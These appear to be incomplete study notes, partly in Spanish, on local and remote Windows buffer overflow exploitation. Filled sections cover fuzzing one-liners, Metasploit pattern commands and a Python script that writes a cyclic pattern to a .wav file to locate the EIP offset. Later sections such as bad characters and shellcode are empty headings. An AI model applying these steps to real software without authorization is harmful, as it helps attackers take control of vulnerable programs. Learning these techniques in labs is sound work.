# Local Buffer Overflow
## Fuzzing

```
python -c "print('A'*10000)"
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

## Controlling EIP

### Creating Unique Pattern

```
/usr/bin/msf-pattern_create -l 5000
```

```
ERC --pattern c 5000
```

### Exploit

win32bof_exploit.py

```
def eip_offset():
	payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5...Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk", "utf-8")

	with open('pattern.wav', 'wb') as f:
		f.write(payload)

eip_offset()
```

### Calculating EIP Offset

```
/usr/bin/msf-pattern_offset -q 31684630
```

Seleccionar EIP, botón derecho y Modificar valor 
```
ERC --pattern o <ASCII value>
```

### Control de EIP

## Indetyfing Bad Characters





## Finding a Return Instruction



## Jumping to Shellcode



# Remote Buffer Overflow

## Remote Fuzzing




## Building a Remote Exploit



## Remote Exploitation